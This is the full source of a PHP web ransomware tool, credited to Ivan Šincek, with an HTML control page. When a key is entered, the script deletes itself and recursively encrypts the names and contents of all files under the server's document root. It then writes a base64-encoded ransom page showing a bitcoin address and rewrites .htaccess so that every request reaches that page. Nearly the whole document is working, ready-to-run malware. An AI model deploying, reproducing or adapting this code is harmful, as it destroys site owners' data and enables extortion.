<?php
error_reporting(0);
class Ransomware {
    private $root = '';
    private $originalKey = '';
    private $cryptoKey = '';
    private $algorithm = 'sha512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->originalKey = $key;
        $this->cryptoKey = hash($this->algorithm, $key);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomName($dir, $extension) {
        do {
            $rand = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $name = $dir . '/' . $rand . '.' . $extension;
        } while (file_exists($name));
        return $name;
    }
    private function createDecryptionFiles() {
        // decryption file encoded in base64
        $data = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmNsYXNzIFJhbnNvbXdhcmUgew0KICAgIHByaXZhdGUgJHJvb3QgPSAnPHJvb3Q+JzsNCiAgICBwcml2YXRlICRjcnlwdG9LZXkgPSAnJzsNCiAgICBwcml2YXRlICRhbGdvcml0aG0gPSAnPGFsZ29yaXRobT4nOw0KICAgIHByaXZhdGUgJGl2ID0gJyc7DQogICAgcHJpdmF0ZSAkY2lwaGVyID0gJzxjaXBoZXI+JzsNCiAgICBwcml2YXRlICRleHRlbnNpb24gPSAnPGV4dGVuc2lvbj4nOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgka2V5KSB7DQogICAgICAgICR0aGlzLT5jcnlwdG9LZXkgPSBoYXNoKCR0aGlzLT5hbGdvcml0aG0sICRrZXkpOw0KICAgICAgICAkdGhpcy0+aXYgPSBiYXNlNjRfZGVjb2RlKCc8aXY+Jyk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdE5hbWUoJHBhdGgpIHsNCiAgICAgICAgJGRlY3J5cHRlZE5hbWUgPSBvcGVuc3NsX2RlY3J5cHQodXJsZGVjb2RlKHBhdGhpbmZvKCRwYXRoLCBQQVRISU5GT19GSUxFTkFNRSkpLCAkdGhpcy0+Y2lwaGVyLCAkdGhpcy0+Y3J5cHRvS2V5LCAwLCAkdGhpcy0+aXYpOw0KICAgICAgICAkZGVjcnlwdGVkTmFtZSA9IHN1YnN0cigkcGF0aCwgMCwgc3Rycmlwb3MoJHBhdGgsICcvJykgKyAxKSAuICRkZWNyeXB0ZWROYW1lOw0KICAgICAgICByZXR1cm4gJGRlY3J5cHRlZE5hbWU7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVsZXRlRGVjcnlwdGlvbkZpbGVzKCkgew0KICAgICAgICB1bmxpbmsoJHRoaXMtPnJvb3QgLiAnLy5odGFjY2VzcycpOw0KICAgICAgICB1bmxpbmsoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsNCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0RmlsZSgkZW5jcnlwdGVkRmlsZSkgew0KICAgICAgICBpZiAocGF0aGluZm8oJGVuY3J5cHRlZEZpbGUsIFBBVEhJTkZPX0VYVEVOU0lPTikgPT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgJGZpbGUgPSAkdGhpcy0+ZGVjcnlwdE5hbWUoJGVuY3J5cHRlZEZpbGUpOw0KICAgICAgICAgICAgaWYgKHJlbmFtZSgkZW5jcnlwdGVkRmlsZSwgJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgJGRhdGEgPSBvcGVuc3NsX2RlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpLCAkdGhpcy0+Y2lwaGVyLCAkdGhpcy0+Y3J5cHRvS2V5LCAwLCAkdGhpcy0+aXYpOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRkYXRhKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0RGlyZWN0b3J5KCRlbmNyeXB0ZWREaXIpIHsNCiAgICAgICAgaWYgKHBhdGhpbmZvKCRlbmNyeXB0ZWREaXIsIFBBVEhJTkZPX0VYVEVOU0lPTikgPT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgcmVuYW1lKCRlbmNyeXB0ZWREaXIsICR0aGlzLT5kZWNyeXB0TmFtZSgkZW5jcnlwdGVkRGlyKSk7DQogICAgICAgIH0NCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBzY2FuKCRkaXIpIHsNCiAgICAgICAgJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsNCiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgICAgICAgICBpZiAoaXNfZGlyKCRkaXIgLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2NhbigkZGlyIC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5kZWNyeXB0RGlyZWN0b3J5KCRkaXIgLiAnLycgLiAkZmlsZSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICR0aGlzLT5kZWNyeXB0RmlsZSgkZGlyIC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBydW4oKSB7DQogICAgICAgICR0aGlzLT5kZWxldGVEZWNyeXB0aW9uRmlsZXMoKTsNCiAgICAgICAgJHRoaXMtPnNjYW4oJHRoaXMtPnJvb3QpOw0KICAgIH0NCn0NCiRlcnJvck1lc3NhZ2VzID0gYXJyYXkoJ2tleScgPT4gJycpOw0KaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSAmJiBzdHJ0b2xvd2VyKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSA9PT0gJ3Bvc3QnKSB7DQogICAgaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pICYmIGlzc2V0KCRfUE9TVFsna2V5J10pKSB7DQogICAgICAgICRwYXJhbWV0ZXJzID0gYXJyYXkoJ2tleScgPT4gJF9QT1NUWydrZXknXSk7DQogICAgICAgIG1iX2ludGVybmFsX2VuY29kaW5nKCdVVEYtOCcpOw0KICAgICAgICAkZXJyb3IgPSBmYWxzZTsNCiAgICAgICAgaWYgKG1iX3N0cmxlbigkcGFyYW1ldGVyc1sna2V5J10pIDwgMSkgew0KICAgICAgICAgICAgJGVycm9yTWVzc2FnZXNbJ2tleSddID0gJ1BsZWFzZSBlbnRlciBkZWNyeXB0aW9uIGtleSc7DQogICAgICAgICAgICAkZXJyb3IgPSB0cnVlOw0KICAgICAgICB9IGVsc2UgaWYgKCRwYXJhbWV0ZXJzWydrZXknXSAhPT0gJzxvcmlnaW5hbEtleT4nKSB7DQogICAgICAgICAgICAvLyBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMNCiAgICAgICAgICAgIC8vIHJlY292ZXJ5DQogICAgICAgICAgICAkZXJyb3JNZXNzYWdlc1sna2V5J10gPSAnV3JvbmcgZGVjcnlwdGlvbiBrZXknOw0KICAgICAgICAgICAgJGVycm9yID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRlcnJvcikgew0KICAgICAgICAgICAgJHJhbnNvbXdhcmUgPSBuZXcgUmFuc29td2FyZSgkcGFyYW1ldGVyc1sna2V5J10pOw0KICAgICAgICAgICAgJHJhbnNvbXdhcmUtPnJ1bigpOw0KICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogLycpOw0KICAgICAgICAgICAgZXhpdCgpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KJGltZyA9ICdpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBSllBQUFDV0NBSUFBQUN6WSthMUFBQUFCbUpMUjBRQS93RC9BUCtndmFlVEFBQURZa2xFUVZSNG5PMmR5MjdqTUF3QW5VWC8vNWZUd3hZNUNJNGdoYVRrY1dZdUMyejhhZ2RFV0lta0g4L244eEF5LzNZL2dFVDUrZi9QNC9GWWM3K3BvRytlcWpsMzJhZDlJdWRHZU4zWEtNU2pRandxeEtOQ1BEK24vNXY0bDBiLzY3MmZWdlNweTR3aU4wbzh0K0hkUXhxRmVGU0lSNFY0VklqblBKMXBpS3hXUkE3dWY5clBVQ0tQMFZ3NU1kbXArRTBhaFhoVWlFZUZlRlNJWnlpZHFTUHg2MzBxNlloa0tNdTJrd1l4Q3ZHb0VJOEs4YWdReitaMFpxcWtwWDl1QTZMK0pRV2pFSThLOGFnUWp3cnhES1V6ZFVYN1U0bkQxSkpLWW9hUytPTlgvQ2FOUWp3cXhLTkNQQ3JFYzU3TzdGcWVTT3cvU3V4ZG1ycHkvK0FLakVJOEtzU2pRandxeFBPNDFMaUV1bEtheUs3V3hURUs4YWdRandyeHFCQlAvdHladWwyZXhPV1lYV05vRWo5OVlSVGlVU0VlRmVKUklaNmgxWmxsbmNxN0J1VkYrcDdxSnRvTW5tc1U0bEVoSGhYaVVTR2VUMHFCcDFaSjZsaFdTalBWWUpWWVdlUGNtVzlCaFhoVWlFZUZlSVkybXhJbjR5MnJqcG02YitJWXZjUVJ3bTQyZlFzcXhLTkNQQ3JFODVmTzFEWCtKSjZidUt1MWE4OHJjcU4zR0lWNFZJaEhoWGhVaU9ldmRtWkJpY2ZJd1ZQMzNmVVlkUzNnbjkzWEtNU2pRandxeEtOQ1BPZnB6TEl2OEdYRDdxN1p0MjN0akJ5SENtK0FDdkdvRUUvNUdMMjZ1cHZJbWxIZERsSGl3WU1ZaFhoVWlFZUZlRlNJWjZoMkpySmFVYmNIMUw5UlpLT3FMcXVxcUpNMkN2R29FSThLOGFnUXozbG5FMklQYU5mc3V3Z1ZWellLOGFnUWp3cnhxQkJQUXUxTWU4V0MvWlE0ZFQ5ZzR0S1ZtMDFmaWdyeHFCQ1BDdkVNamRGcm1Qb1N2c2c0M3NSUDYzSzlxWVBkYkxvUEtzU2pRandxeEpNL0ZiaGhXZFBRc3IybnFjZEl2SkZqOUc2TEN2R29FSThLOFd4K28zWmQvM1RpL3RHeTRYNVR1RHB6SDFTSVI0VjRWSWduLzQzYWZSSzdxeE92dkt2QnlxbkFjaHdxdkFFcXhLTkNQT2ViVFhXOVBQMGJKYzRNM2pYcnIrNmRUZThPTmdyeHFCQ1BDdkdvRU05UTdjeXlOeE1rMXRFMjFEVXI3WHEvMVF1akVJOEs4YWdRandyeGZOTFpWRWVrcGFnaGNVbGwyVnZBUDh0dWpFSThLc1NqUWp3cXhIT3RkS1loa3QwczJ4SnFxS3RDc3JQcHRxZ1Fqd3J4cUJEUEo0M2F5NmlyN28wVTdQWlozeUJ1Rk9KUklSNFY0bEVobnZKWFVDNWoxN0NZL3FVV0xDRVpoWGhVaUVlRmVGU0laL1BjR1lsakZPSlJJWjVmZWd0VFVBWHBWaFVBQUFBQVNVVk9SSzVDWUlJPSc7DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoJPGhlYWQ+DQoJCTxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCgkJPHRpdGxlPlJhbnNvbXdhcmU8L3RpdGxlPg0KCQk8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iUEhQIHJhbnNvbXdhcmUuIj4NCgkJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkhUTUwsIENTUywgUEhQLCByYW5zb213YXJlIj4NCgkJPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJJdmFuIMWgaW5jZWsiPg0KCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQoJCTxzdHlsZT4NCgkJCWh0bWwgew0KCQkJCWhlaWdodDogMTAwJTsNCgkJCX0NCgkJCWJvZHkgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICMyNjI2MjY7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbjogMDsNCgkJCQloZWlnaHQ6IGluaGVyaXQ7DQoJCQkJY29sb3I6ICNGOEY4Rjg7DQoJCQkJZm9udC1mYW1pbHk6ICJBcm1hdGEiLCBzYW5zLXNlcmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7DQoJCQkJdGV4dC1hbGlnbjogbGVmdDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJCQlqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCgkJCQlmbGV4OiAxIDAgYXV0bzsNCgkJCQlwYWRkaW5nOiAwLjVlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEQ0RDREM7DQoJCQkJcGFkZGluZzogMS41ZW07DQoJCQkJd2lkdGg6IDIxZW07DQoJCQkJY29sb3I6ICMwMDA7DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIHsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhlYWRlciAudGl0bGUgew0KCQkJCW1hcmdpbjogMDsNCgkJCQlmb250LXNpemU6IDIuNmVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCB7DQoJCQkJdGV4dC1hbGlnbjogY2VudGVyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgcCB7DQoJCQkJbWFyZ2luOiAxZW0gMDsNCgkJCQljb2xvcjogIzJGNEY0RjsNCgkJCQlmb250LXdlaWdodDogNjAwOw0KCQkJCXdvcmQtd3JhcDogYnJlYWstd29yZDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IGltZyB7DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFkdmljZSBwIHsNCgkJCQltYXJnaW46IDFlbSAwIDAgMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSB7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbi10b3A6IDFlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dCB7DQoJCQkJLXdlYmtpdC1hcHBlYXJhbmNlOiBub25lOw0KCQkJCS1tb3otYXBwZWFyYW5jZTogbm9uZTsNCgkJCQlhcHBlYXJhbmNlOiBub25lOw0KCQkJCW1hcmdpbjogMDsNCgkJCQlwYWRkaW5nOiAwLjJlbSAwLjRlbTsNCgkJCQlmb250LWZhbWlseTogIkFybWF0YSIsIHNhbnMtc2VyaWY7DQoJCQkJZm9udC1zaXplOiAxZW07DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzlEMkEwMDsNCgkJCQktd2Via2l0LWJvcmRlci1yYWRpdXM6IDA7DQoJCQkJLW1vei1ib3JkZXItcmFkaXVzOiAwOw0KCQkJCWJvcmRlci1yYWRpdXM6IDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il0gew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNGRjQ1MDA7DQoJCQkJY29sb3I6ICNGOEY4Rjg7DQoJCQkJY3Vyc29yOiBwb2ludGVyOw0KCQkJCXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIwbXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjRDgzQTAwOw0KCQkJCXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIwbXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIC5lcnJvciB7DQoJCQkJbWFyZ2luOiAwIDAgMWVtIDA7DQoJCQkJY29sb3I6ICM5RDJBMDA7DQoJCQkJZm9udC1zaXplOiAwLjhlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSAuZXJyb3I6bm90KDplbXB0eSkgew0KCQkJCW1hcmdpbjogMC4yZW0gMCAxZW0gMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBsYWJlbCB7DQoJCQkJbWFyZ2luLWJvdHRvbTogMC4yZW07DQoJCQkJaGVpZ2h0OiAxLjJlbTsNCgkJCX0NCgkJCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDQ4MHB4KSB7DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJCXdpZHRoOiAxNS41ZW07DQoJCQkJfQ0KCQkJfQ0KCQkJQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDogMzIwcHgpIHsNCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJCQkJd2lkdGg6IDE0LjVlbTsNCgkJCQl9DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgLnRpdGxlIHsNCgkJCQkJZm9udC1zaXplOiAyLjRlbTsNCgkJCQl9DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgcCB7DQoJCQkJCWZvbnQtc2l6ZTogMC45ZW07DQoJCQkJfQ0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFkdmljZSBwIHsNCgkJCQkJZm9udC1zaXplOiAwLjllbTsNCgkJCQl9DQoJCQl9DQoJCTwvc3R5bGU+DQoJPC9oZWFkPg0KCTxib2R5Pg0KCQk8ZGl2IGNsYXNzPSJmcm9udC1mb3JtIj4NCgkJCTxkaXYgY2xhc3M9ImxheW91dCI+DQoJCQkJPGhlYWRlcj4NCgkJCQkJPGgxIGNsYXNzPSJ0aXRsZSI+UmFuc29td2FyZTwvaDE+DQoJCQkJPC9oZWFkZXI+DQoJCQkJPGRpdiBjbGFzcz0iYWJvdXQiPg0KCQkJCQk8cD5NYWRlIGJ5IEl2YW4gxaBpbmNlay48L3A+DQoJCQkJCTxwPkkgaG9wZSB5b3UgbGlrZSBpdCE8L3A+DQoJCQkJCTxwPkZlZWwgZnJlZSB0byBkb25hdGUgYml0Y29pbi48L3A+DQoJCQkJCTxpbWcgc3JjPSJkYXRhOmltYWdlL2dpZjtiYXNlNjQsPD9waHAgZWNobyAkaW1nOyA/PiIgYWx0PSJCaXRjb2luIFdhbGxldCI+DQoJCQkJCTxwPjFCclpNNlQ3RzlSTjh2YmFibmZYdTRNNkxwZ3p0cTZZMTQ8L3A+DQoJCQkJPC9kaXY+DQoJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/cGhwIGVjaG8gJy8nIC4gcGF0aGluZm8oJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddLCBQQVRISU5GT19CQVNFTkFNRSk7ID8+Ij4NCgkJCQkJPGxhYmVsIGZvcj0ia2V5Ij5EZWNyeXB0aW9uIEtleTwvbGFiZWw+DQoJCQkJCTxpbnB1dCBuYW1lPSJrZXkiIGlkPSJrZXkiIHR5cGU9InRleHQiIHNwZWxsY2hlY2s9ImZhbHNlIiBhdXRvZm9jdXM9ImF1dG9mb2N1cyI+DQoJCQkJCTxwIGNsYXNzPSJlcnJvciI+PD9waHAgZWNobyAkZXJyb3JNZXNzYWdlc1sna2V5J107ID8+PC9wPg0KCQkJCQk8aW5wdXQgbmFtZT0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCgkJCQk8L2Zvcm0+DQoJCQkJPGRpdiBjbGFzcz0iYWR2aWNlIj4NCgkJCQkJPHA+RGVjcnlwdGlvbiBrZXkgaXMgaW5zaWRlIGNvZGUuPC9wPg0KCQkJCQk8cCBpZD0icmVjb3ZlcnkiIGhpZGRlbj0iaGlkZGVuIj48P3BocCBlY2hvICc8b3JpZ2luYWxLZXk+JzsgPz48L3A+DQoJCQkJPC9kaXY+DQoJCQk8L2Rpdj4NCgkJPC9kaXY+DQoJPC9ib2R5Pg0KPC9odG1sPg0K');
        $data = str_replace(array('<root>', '<originalKey>', '<algorithm>', '<iv>', '<cipher>', '<extension>'), array($this->root, $this->originalKey, $this->algorithm, base64_encode($this->iv), $this->cipher, $this->extension), $data);
        $decryptionFile = $this->generateRandomName($this->root, 'php');
        file_put_contents($decryptionFile, $data);
        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
        file_put_contents($this->root . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\n");
    }
    private function encryptName($path) {
        do {
            $encryptedName = urlencode(openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv));
            $encryptedName = substr($path, 0, strripos($path, '/') + 1) . $encryptedName . '.' . $this->extension;
        } while (file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptFile($file) {
        $encryptedFile = $this->encryptName($file);
        if (rename($file, $encryptedFile)) {
            $encryptedData = openssl_encrypt(file_get_contents($encryptedFile), $this->cipher, $this->cryptoKey, 0, $this->iv);
            if (file_exists($encryptedFile)) {
                file_put_contents($encryptedFile, $encryptedData);
            }
        }
    }
    private function encryptDirectory($dir) {
        rename($dir, $this->encryptName($dir));
    }
    private function scan($dir) {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            if (is_dir($dir . '/' . $file)) {
                $this->scan($dir . '/' . $file);
                $this->encryptDirectory($dir . '/' . $file);
            } else {
                $this->encryptFile($dir . '/' . $file);
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        $this->scan($this->root);
        $this->createDecryptionFiles();
    }
} $errorMessages = array('key' => '');
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['submit']) && isset($_POST['key'])) {
        $parameters = array('key' => $_POST['key']);
        mb_internal_encoding('UTF-8');
        $error = false;
        if (mb_strlen($parameters['key']) < 1) {
            $errorMessages['key'] = 'Please enter encryption key';
            $error = true;
        }
        if (!$error) {
            $ransomware = new Ransomware($parameters['key']);
            $ransomware->run();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="PHP ransomware.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: "Armata", sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: "Armata", sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessages['key']; ?></p>
					<input name="submit" type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
